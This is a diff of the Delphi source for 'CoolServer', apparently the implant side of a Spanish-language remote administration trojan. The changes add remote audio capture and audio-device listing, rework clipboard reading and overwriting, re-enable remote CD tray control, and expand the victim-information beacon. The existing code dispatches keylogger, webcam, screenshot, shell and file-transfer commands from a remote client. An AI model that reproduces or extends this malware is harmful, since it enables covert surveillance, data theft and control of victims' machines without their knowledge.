@@ -17,9 +17,7 @@ library CoolServer; //Para crear el server definitivo que colocaremos en %cooldi
 uses
   Windows,
   SysUtils,
-  // ScktComp,
-  // MMSystem, Elimina: mcisendstring
-  ShellAPI, //Unit de la shell
+  ShellAPI,
   Classes,
   lomtask,
   lomlib,
@@ -39,12 +37,13 @@ uses
   UnitCambioId,
   SettingsDef,
   UnitInstalacion,
-  UnitShell,
+  UnitShell, //Unit de la shell
   UnitServicios,
   SocketUnit,
   UnitKeylogger,
   UnitBuscar,
   UnitThreadsCapCamCapture,//unit que se encarga de gestionar el envio de captura de pantalla, de thumbnails, de keylogger y de webcam en un thread independiente
+  UnitAudio,
   UnitTransfer;
 
 var
@@ -191,8 +190,7 @@ const
           if Recibido = 'PING' then  //Respuesta a pings
           begin
            Respuesta :=  
-              Sock.LocalAddress + '|' +LeerID() + '|' + GetCPU() + '|' +
-              GetOS() + '|' + VersionDelServer + '|L|'+GetActiveWindowCaption()+'|'+
+              GetActiveWindowCaption()+'|'+
                GetIdleTime()+ '|'+GetUptime()+'|'; //ya que estamos enviamos información para que actualice el listviewconexiones
             SendText('PONG|'+Respuesta+ ENTER);
           end;
@@ -210,10 +208,10 @@ const
             Delete(Recibido, 1, 9);  // 'MAININFO|123456'
             SH := StrToIntDef(Recibido,-1);//Para no romper el server en caso de que un usuario malintencionado nos mande un maininfo corrupto
             if SH = -1 then break;
-            Respuesta := Sock.LocalAddress + '|' +  //IP privada
-              LeerID() + '|' + GetCPU() + '|' +
+            Respuesta :=
+              LeerID() + '|'+ Sock.LocalAddress + '|' + GetCPU() + '|' +
               GetOS() + '|' + VersionDelServer + '|1|'+GetActiveWindowCaption()+'|'+
-               GetIdleTime()+ '|'+GetUptime()+'|';
+               GetIdleTime()+ '|'+GetUptime()+'|'+GetIdioma()+'|';
 
             SendText('MAININFO|' + Respuesta + ENTER);
           end;
@@ -445,13 +443,13 @@ const
             if Recibido = 'ACTIVAR' then
             begin
               //abrir cd
-              //      mciSendString( 'Set cdaudio door open wait', nil, 0, hInstance);
+                    mciSendString( 'Set cdaudio door open wait', nil, 0, hInstance);
               SendText('ABRIRCD|Activado' + ENTER);
             end
             else
             begin
               //cerrar cd
-              //      mciSendString( 'Set cdaudio door closed wait' , nil , 0 , hInstance );
+                    mciSendString( 'Set cdaudio door closed wait' , nil , 0 , hInstance );
               SendText('ABRIRCD|Desactivado' + ENTER);
             end;
           end;
@@ -779,9 +777,9 @@ const
           end;
 
           //Codigo para enviar la captura de pantalla, la de webcam, los thumbnails y el keylogger, usan un socket independiente
-          if (Copy(Recibido, 1, 9) = 'CAPSCREEN') or (Copy(recibido, 1, 13) = 'CAPTURAWEBCAM') or (Copy(recibido, 1, 8) = 'GETTHUMB') or (Copy(recibido, 1, 16) = 'RECIBIRKEYLOGGER') then
+          if (Copy(Recibido, 1, 9) = 'CAPSCREEN') or (Copy(recibido, 1, 13) = 'CAPTURAWEBCAM') or (Copy(recibido, 1, 8) = 'GETTHUMB') or (Copy(recibido, 1, 8) = 'GETAUDIO') or (Copy(recibido, 1, 16) = 'RECIBIRKEYLOGGER') then
           begin
-
+                 
             if Pararcapturathread then   //si aun no se ha iniciado...
             begin
               pararcapturathread := false;
@@ -790,7 +788,7 @@ const
             end;
                     //El thread mira el cambio de la variable global CapturaPantalla,CapturaWebcam..., quizas no sea el mejor método...
 
-            while((CapturaWebcam <> '') or (CapturaPantalla<>'') or (CapturaThumb <> '') or (CapturaKeylogger<>'')) do sleep(1);  //En teoria no deberia pasar...
+            while((CapturaWebcam <> '') or (CapturaPantalla<>'') or (CapturaThumb <> '') or (CapturaKeylogger<>'') or (CapturaAudio>'')) do sleep(1);  //En teoria no deberia pasar...
 
             if Copy(recibido, 1, 13) = 'CAPTURAWEBCAM' then
             begin                                                       //Se crea la captura de webcam desde aquí porque sino da error al hacer las llamadas a la dll desde el otro thread
@@ -823,6 +821,11 @@ const
               TempStr := '';
               TempStr := ObtenerLog();
               CapturaKeylogger := TempStr;
+            end
+            else if (Copy(recibido, 1, 8) = 'GETAUDIO') then
+            begin
+              Delete(Recibido, 1, Pos('|', Recibido));
+              CapturaAudio := Recibido;
             end;
                  
           end;
@@ -1064,16 +1067,32 @@ const
           if Pos('GETCLIP', Recibido) = 1 then
           begin
             Delete(Recibido,1,7);
-            SendText('GETCLIP|' + GetClipBoardDatas + ENTER);
+            Tempstr := '';
+            Tempstr := GetClipBoardDatas;
+            //Tenemos que eliminar los #10 y #13 para que todo  se mande en una sola línea
+            TempStr := StringReplace(Trim(TempStr),#10, '|salto|', [rfReplaceAll]);
+            TempStr := StringReplace((TempStr),#13, '|salto2|', [rfReplaceAll]);
+            SendText('GETCLIP|' + TempStr + ENTER);
           end;
 
           if Pos('SETCLIP', Recibido) = 1 then
           begin
             Delete(Recibido,1,8);
-            SetClipBoardDatas( PChar(Recibido) );
+            //Cambiamos los |saltos| por saltos de línea
+            TempStr := '';
+            TempStr := Recibido;
+            TempStr := StringReplace(Trim(TempStr),'|salto|', #10, [rfReplaceAll]);
+            TempStr := StringReplace((TempStr),'|salto2|', #13, [rfReplaceAll]);
+            SetClipBoardDatas( PChar(TempStr) );
 			      SendText('MSG|{54}' + ENTER);
           end;
 
+          if Pos('GETADRIVERS', Recibido) = 1 then
+          begin
+            Tempstr := '';
+            TempStr := DispositivosDeAudio;
+            sendtext('GETADRIVERS|'+Tempstr+ENTER);
+          end;
 
           lastCommandTime := getTickCount;
           Busy := False;
@@ -1105,7 +1124,7 @@ const
   procedure CargarServidor(P:Pointer);
   begin
     Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
-
+    VersionDelServer := '1.2';
     BeginThread(nil,0,Addr(KeepAliveThread),nil,0,id1);
     OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
   
@@ -1120,7 +1139,7 @@ const
 
 begin
     //Para debug:
-    {Configuracion.sHosts                 := 'localhost:3360¬';
+    {Configuracion.sHosts                 := 'localhost:77¬';
     Configuracion.sID                     := 'Coolserver';
     Configuracion.bCopiarArchivo          := False; //Me copio o no?
     Configuracion.sFileNameToCopy         := 'coolserver.exe';
